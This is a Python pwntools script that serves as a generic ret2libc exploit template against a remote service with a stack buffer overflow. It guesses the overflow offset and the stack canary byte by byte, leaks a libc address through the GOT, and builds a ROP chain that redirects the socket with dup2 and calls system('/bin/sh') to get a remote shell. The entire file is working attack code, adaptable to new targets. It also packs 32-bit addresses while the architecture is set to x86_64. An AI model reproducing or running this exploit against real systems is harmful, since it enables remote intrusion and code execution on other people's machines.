# -*- coding: utf-8 -*-

#
# Name: generic_ret2libc
#
# Author: Autonomoid
# Modification date: 2024-10-01
# Licence: GPL 2.0
#

from pwn import *
from ropper import RopperService
import os

# Use pwnlib logger
context.log_level = 'info'

###############################################################################
############################ NON-GENERIC CODE #################################
###############################################################################

# Target-specific details.
TARGET_IP_ADDRESS = "0.0.0.0"
TARGET_PORT = 1234
BINARY_FILE = 'vulnerable'

## To determine libc version do: ldd ./vulnerable

#LIBC_FILE = '/lib/i386-linux-gnu/libc.so.6' 
LIBC_FILE = '/lib/x86_64-linux-gnu/libc.so.6'

## To determine arch do: file ./vulnerable

#BINARY_ARCH = 'x86'
BINARY_ARCH = 'x86_64'

###############################################################################

# Binary-specific details

def setup_function(conn):
    """
    Prepare the binary to accept the buffer overflow.
    """
    conn.recvuntil('Select menu > ')
    conn.sendline('1')
    conn.recvuntil('Message: ')

def exit_function(conn):
    """
    Exit the binary cleanly.
    """
    conn.recvuntil('Select menu > ')
    conn.sendline('3')

###############################################################################
############################# GENERIC CODE ####################################
###############################################################################

def send_function(payload):
    """
    Sends a payload to the target service and checks if it was successful.
    Returns True if the payload was safe (didn't crash the binary),
    and False if the binary crashed or gave an unexpected response.
    """
    log.info(f'Sending payload with length {len(payload)}')

    try:
        conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
        setup_function(conn)
        conn.send(payload)
        exit_function(conn)

        # Try to receive data with a timeout, to detect if the service crashes
        try:
            exit_data = conn.recvall(timeout=2)  # Timeout ensures we don't hang indefinitely
            conn.close()

            # Log the received data for debugging
            log.debug(f"Received data: {exit_data}")

            if b'Exiting...' in exit_data:  ####### IMPORTANT - YOU MUST CHANGE THIS ##########
                return True  # Binary didn't crash, canary likely correct
            else:
                return False  # Binary crashed or incorrect response

        except EOFError:
            # If we receive an EOFError, it means the connection was closed unexpectedly (likely a crash)
            log.warn("Connection closed unexpectedly (service may have crashed).")
            return False  # Treat this as a crash

    except Exception as e:
        # Ensure that we pass a valid message to log.error
        error_message = str(e) if e else "Unknown error"
        log.warn(f"Error communicating with the target: {error_message}")
        return False  # Treat any exception as a crash or unsuccessful attempt



def guess_offset(initial_payload=''):
    """
    Brute-force to find the buffer offset for the stack canary.
    """
    log.info("guess_offset()")

    offset = 0
    is_safe = True
    while is_safe:
        log.info(f"[+] Offset: {'#' * offset} ({offset})")
        offset += 1
        payload = initial_payload + 'A' * offset
        is_safe = send_function(payload)
        print(f"is_safe: {is_safe}")
    return offset - 1


def guess_canary(canary_offset):
    """
    Brute-force the stack canary value byte by byte.
    """
    log.info("Starting canary brute-forcing")
    canary_length = 4  # Assuming a 4-byte canary
    canary = b''  # Start with an empty canary
    
    while len(canary) < canary_length:
        found_byte = False
        for byte in range(256):  # Brute force each byte (0 to 255)
            payload = b'A' * canary_offset + canary + bytes([byte])
            log.info(f"Trying byte {byte} for canary at offset {len(canary)}")
            
            # Call send_function() to check if the binary crashed or if the byte is correct
            if send_function(payload):
                # If the service didn't crash, we assume the byte is correct
                canary += bytes([byte])
                log.info(f"[+] Canary byte found: {hex(byte)}")
                found_byte = True
                break  # Go to the next byte

        if not found_byte:
            log.error("Failed to find the next byte of the canary. Something went wrong.")
            break
    
    log.info(f"[+] Final canary: {canary.hex()}")
    return canary

###############################################################################

def retrieve_or_guess_canary():
    """
    Get the stack canary from cache or brute-force it.
    Store the canary offset and value in separate files.
    """
    canary_offset_file = 'canary_offset'
    canary_value_file = 'canary_value'
    
    # Check if both files exist
    if os.path.isfile(canary_offset_file) and os.path.isfile(canary_value_file):
        with open(canary_offset_file, 'r') as offset_file:
            canary_offset = int(offset_file.readline().strip())
        with open(canary_value_file, 'r') as value_file:
            canary = value_file.read()
        log.info(f"[+] Cached canary offset = {canary_offset}")
        log.info(f"[+] Cached canary value  = {canary}")
        return canary_offset, canary
    else:
        try:
            # Guess the canary and offset
            canary_offset = guess_offset()

            # Write the canary offset to the offset file
            with open(canary_offset_file, 'w') as offset_file:
                offset_file.write(f"{canary_offset}\n")
                offset_file.flush()  # Ensure the data is written immediately

            log.info(f"[+] Wrote canary offset to {canary_offset_file}: {canary_offset}")

            canary = guess_canary(canary_offset)

            # Ensure canary is in bytes before decoding
            if isinstance(canary, bytes):
                canary_str = canary.decode('latin1')
            else:
                log.error("Canary is not in byte format, can't write to file.")
                return None

            # Write the canary value to the value file
            with open(canary_value_file, 'w') as value_file:
                value_file.write(canary_str)  # Write the decoded canary
                value_file.flush()  # Ensure the data is written immediately

            log.info(f"[+] Wrote canary value to {canary_value_file}: {canary_str}")

            return canary_offset, canary
        
        except Exception as e:
            log.error(f"Error while writing the canary to file: {str(e)}")
            return None


###############################################################################

def retrieve_or_guess_return_address_offset(canary_offset, canary):
    """
    Find the return address offset by brute-forcing it, or retrieve it from a cache.
    """
    offset_file = 'return_address_offset'
    
    if os.path.isfile(offset_file):
        with open(offset_file, 'r') as temp:
            return_address_offset = int(temp.readline().strip())
            log.info(f"[+] Cached return address offset = {return_address_offset}")
            return return_address_offset
    else:
        try:
            initial_payload = b'A' * canary_offset + canary
            return_address_offset = guess_offset(initial_payload)
            
            # Write the return_address_offset to the file
            with open(offset_file, 'w') as temp:
                temp.write(f"{return_address_offset}\n")
                temp.flush()  # Ensure the data is written to the file immediately

            log.info(f"[+] Wrote return address offset to cache: {return_address_offset}")

            return return_address_offset
        
        except Exception as e:
            log.error(f"Error writing return address offset to file: {str(e)}")
            raise


###############################################################################

def make_infoleak_payload(canary, canary_offset, return_address_offset, send_address, socket_fd, address_to_leak):
    """
    Create payload for leaking information from memory using a known address.
    """
    payload = b'A' * canary_offset
    payload += canary
    payload += b'B' * return_address_offset
    payload += p32(send_address)
    payload += b'XXXX'
    payload += p32(socket_fd)
    payload += p32(address_to_leak)
    payload += p32(4)  # Length of leak
    payload += p32(0)  # Unused argument
    return payload

###############################################################################

def infoleak(conn, infoleak_payload):
    """
    Use the infoleak payload to extract data from the target binary.
    """
    setup_function(conn)
    conn.send(infoleak_payload)
    exit_function(conn)
    leaked_data = conn.recv(4)
    conn.close()
    return u32(leaked_data.ljust(4, b'\x00'))

###############################################################################

def calculate_libc_base(leaked_data, libc_file):
    """
    Calculate the base address of libc using the leaked data.
    """
    libc = ELF(libc_file)
    libc_offset = libc.symbols['__libc_start_main']
    libc_base = leaked_data - libc_offset
    log.info(f"[+] libc base address = {hex(libc_base)}")
    return libc_base, libc

###############################################################################

def find_pop_pop_ret(binary_file):
    """
    Find the address of a 'pop, pop, ret' gadget using ropper.
    """

    rs = RopperService()
    rs.addFile(binary_file)
    rs.options.arch = BINARY_ARCH
    rs.options.type = 'rop'
    rs.loadGadgetsFor()
    gadgets = rs.searchPopPopRet()
    return gadgets.items()[0][1][0].address

###############################################################################

def make_exploit_payload(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address):
    """
    Build the final ROP chain that will execute the exploit and spawn a shell.
    """
    stdin_fd = 0
    stdout_fd = 1
    socket_fd = 4

    dup2_address = libc_base + libc.symbols['dup2']
    system_address = libc_base + libc.symbols['system']
    bin_sh_address = libc_base + next(libc.search(b"/bin/sh"))

    rop_chain = b'A' * canary_offset
    rop_chain += canary
    rop_chain += b'B' * return_address_offset

    # dup2(socket_fd, stdin_fd)
    rop_chain += p32(dup2_address) + p32(pop_pop_ret_address)
    rop_chain += p32(socket_fd) + p32(stdin_fd)

    # dup2(socket_fd, stdout_fd)
    rop_chain += p32(dup2_address) + p32(pop_pop_ret_address)
    rop_chain += p32(socket_fd) + p32(stdout_fd)

    # system("/bin/sh")
    rop_chain += p32(system_address) + b'XXXX' + p32(bin_sh_address)

    return rop_chain

###############################################################################

def exploit_binary(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address):
    """
    Execute the exploit by sending the payload to the target binary.
    """
    conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
    exploit_payload = make_exploit_payload(
        canary, canary_offset, return_address_offset,
        libc_base, libc, binary, pop_pop_ret_address)
    setup_function(conn)
    conn.send(exploit_payload)
    exit_function(conn)
    conn.interactive()

###############################################################################
############################ MAIN EXECUTION ###################################
###############################################################################

def main():
    """
    Main function to coordinate the exploit process.
    """
    binary = ELF(BINARY_FILE)

    # Retrieve canary and offsets (brute-force if not cached)
    canary_offset, canary = retrieve_or_guess_canary()

    return_address_offset = retrieve_or_guess_return_address_offset(canary_offset, canary)

    # Leak libc address
    send_address = binary.symbols['send']
    address_to_leak = binary.symbols['got.__libc_start_main']
    infoleak_payload = make_infoleak_payload(canary, canary_offset, return_address_offset, send_address, 4, address_to_leak)
    conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
    leaked_data = infoleak(conn, infoleak_payload)

    # Calculate libc base address
    libc_base, libc = calculate_libc_base(leaked_data, LIBC_FILE)

    # Find ROP gadgets
    pop_pop_ret_address = find_pop_pop_ret(BINARY_FILE)

    # Exploit the binary
    exploit_binary(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address)

if __name__ == '__main__':
    main()
